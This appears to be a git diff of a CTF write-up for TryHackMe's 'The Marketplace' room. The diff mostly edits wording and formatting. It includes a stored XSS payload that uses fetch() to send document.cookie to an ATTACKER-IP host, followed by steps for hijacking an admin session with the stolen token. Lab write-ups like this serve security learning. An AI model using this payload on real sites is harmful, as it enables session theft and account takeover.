@@ -19,7 +19,7 @@ mermaid: true
 
 >The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.
 
-And that's all there is! We are now left alone to figure out where those three flags are 🤔 !
+And that's all there is! We are now left alone to figure out where those three flags are 🚩🚩🚩🤔 !
 
 There are a lot of concepts involved in this CTF room, so let's see what kind of background knowledge is needed for solving it.
 
@@ -43,7 +43,7 @@ If the above information does not make sense, try going through TryHackMe's [XSS
 
 **Cookies** are small pieces of data that are stored on our computer, and they are saved when we receive a "*Set-Cookie*" header from a web server. Because *HTTP* is *stateless* (does not keep track of previous requests), cookies can be used to remind the web server who we are. 
 
-Cookies have many uses, but are most commonly used for website authentication. They don't have a plaintext format so we can't see the password, but they come in the form of a **token**, a unique secret code that isn't easily humanly guessable.
+Cookies have many uses, but are most commonly used for website authentication. They don't have a plaintext format, so we can't see the password, but they come in the form of a **token**, a unique secret code that isn't easily humanly guessable.
 
 ![cookie-auth](https://media.geeksforgeeks.org/wp-content/uploads/20211206163821/Group2copy-660x330.jpg)
 
@@ -65,7 +65,11 @@ When a web application communicates with a database using input from a user that
 
 ![sqli_explained](https://images.spiceworks.com/wp-content/uploads/2022/05/13064935/Functioning-of-an-SQL-Injection.png){: width="60%"}
 
-The process of an SQLi is explained in great detail, in a step-by-step fashion, in the [SQL Injection](https://tryhackme.com/room/sqlinjectionlm) room. 
+The process of an SQLi is explained in great detail, in a step-by-step fashion, in the [SQL Injection](https://tryhackme.com/room/sqlinjectionlm) room.
+
+### 2.5 Containers
+
+
 
 ## 3 CTF Process
 
@@ -75,7 +79,7 @@ Let's start by visiting the website:
 
 ![marketplace_homepage](marketplace_homepage.png)
 
- One of the first things we always do, is checking if there is a [`/robots.txt`](https://moz.com/learn/seo/robotstxt) subdirectory, and in this case there is! It tells us that there is an forbidden `/admin` location, and, as expected, we are not authorized to view it; yet! 
+ One of the first things we always do, is checking if there is a [`/robots.txt`](https://moz.com/learn/seo/robotstxt) subdirectory, and in this case there is! It tells us that there is an disallowed `/admin` location, and, as expected, we are not authorized to view it; yet! 
 
 ![robots-txt](robots-txt.png)
 
@@ -83,10 +87,10 @@ Let's start by visiting the website:
 
 While exploring the site, there are some more things to note down:
 
-1. There is a **Log In** page. It is always worth experimenting with such a page and trying out some default credentials as it can give us back informative error messages.
-2. There is also a **Sign up** page. The **hint** provided on the first question, i.e. "*If you think a listing is breaking the rules, you can report it!*", make us think that we should probably should create an account and report something.
+1. There is a **Log In** page. It is always worth experimenting with such a page by trying out some default credentials, as it can give us back informative error messages.
+2. There is also a **Sign up** page. The **hint** provided on the first question, i.e. "*If you think a listing is breaking the rules, you can report it!*", make us think that we should probably create an account and report a listing.
 
-Let's start checking each point in sequence.
+Let's start by checking the first point:
 
 When trying to log in with random creds, for example, `admin:admin`, we got the following message:
 
@@ -96,63 +100,67 @@ The images found on the homepage are having their publishers listed, `michael` a
 
 ![invalid-password](invalid-password.png)
 
-So we already have two **valid usernames** at hand, and we could try a *dictionary attack with `hydra`* to see if we can find their passwords, a similar process we did at the [Mr Robot](https://cspanias.github.io/posts/Mr-Robot-Write-Up-(2023)/#23-dictionary-attack-with-hydra) room, but, unfortunately, it does not work this time.
+So we already have two **valid usernames** at hand, and we could try a *dictionary attack with **hydra** to see if we can find their passwords, a similar process we did at the [Mr Robot](https://cspanias.github.io/posts/Mr-Robot-Write-Up-(2023)/#23-dictionary-attack-with-hydra) room, but, unfortunately, it does not work this time.
 
-Let's try to exploit our second point, the **Sign up** page as well as the author's **hint**, as it should logically guide us to the first flag.
+Let's try to exploit our second point, the **Sign up** page as well as the author's **hint**, as it should logically guide us to the first 🚩.
 
 When signing up, the *New listing* option appears at the top right menu:
 
-![new-listing](new-listing.png){: width="50%"}
+![new-listing](new-listing.jpg){: width="50%"}
 
-We can check if the site is vulnerable to [XSS](https://owasp.org/www-community/attacks/xss/), by writing some simple code and see how the site reacts:
+We can check if the site is vulnerable to [XSS](https://owasp.org/www-community/attacks/xss/), by writing some simple JavaScript code, and see how the site reacts:
+
+```javascript
+<script>alert("XSS!")</script>
+```
 
 <video controls="" width="800" height="500" muted="" loop="" autoplay="">
 <source src="https://github.com/CSpanias/cspanias.github.io/raw/main/assets/marketplace/xss.mp4" type="video/mp4">
 </video>
 
-Now, we can take advantage of the hint. If we visit the **developer's console** (*right-click --> inspect --> console tab*) we can find our **session cookie**:
+Now that we know that the site is **vulnerable to XSS**, we can take advantage of the hint. If we visit the **developer's console** (*right-click --> inspect --> console tab*) we can find our **session cookie**:
 
 ![session-cookie](document-cookie.png)
 
 The plan is as follows:
 1. Open a **python http server**:
 
-```shell
-python -m http.server 12345
-```
+    ```shell
+    python -m http.server 12345
+    ```
 
 2. Create a new listing with code that will **steal another user's cookie and sent it back to us**.
 
-```javascript
-<script>fetch("http://ATTACKER-IP:12345/"+document.cookie)</script>
-```
+    ```javascript
+    <script>fetch("http://ATTACKER-IP:12345/"+document.cookie)</script>
+    ```
 
-![cookie-stealer](cookie-stealer.png)
+    ![cookie-stealer](cookie-stealer.png)
 
 3. Now, we need a way to **"force" an admin to interact with our listing**. That is because we want the code to be executed on the admin's browser, and not ours. This is where the reporting hint comes handy. We can create a new listing, report it, and then an admin should come and review it.
 
-![report-to-admin](report-to-admin.jpg){: width="50%"}
+    ![report-to-admin](report-to-admin.jpg){: width="50%"}
 
 4. When we click *Report*, we get a message *From System* saying among others: "*One of our admins will evaluate...*". We should already have received our session cookie on the python server by now. After a few seconds, we refresh the page, and we have a new message that our post has been reviewed. Alongside that, we also got the admin's cookie!
 
-![admin-cookie](admin-cookie.png)
+    ![admin-cookie](admin-cookie.png)
 
-> Don't get confused because the port is shwoing as `8888` instead of `12345`. I just had to restart and ended up to use another port!
+    > Don't get confused because the port is shwoing as `8888` instead of `12345`. I just had to restart and ended up to use another port!
 
 5. All we have to do now, is swapping our cookie with admin's cookie to access. We can do that by the brower's console:
 
-```javascript
-// we need to allow pasting, so we can paste our cookie
-allow pasting
-// set cookie with the value of the admin's cookie
-document.cookie="token=ADMIN_COOKIE"
-```
+    ```javascript
+    // we need to allow pasting, so we can paste our cookie
+    allow pasting
+    // set cookie with the value of the admin's cookie
+    document.cookie="token=ADMIN_COOKIE"
+    ```
 
-![cookie-swap](cookie-swap.png)
+    ![cookie-swap](cookie-swap.png)
 
-Once we refresh the page, the **Administration panel** appears, which includes our first 🚩 🍻!
+6. Once we refresh the page, the **Administration panel** appears, which includes our first 🚩🍻!
 
-![admin-panel](admin-panel.jpg)
+    ![admin-panel](admin-panel.jpg)
 
 ### 3.2 IDOR & SQLi
 
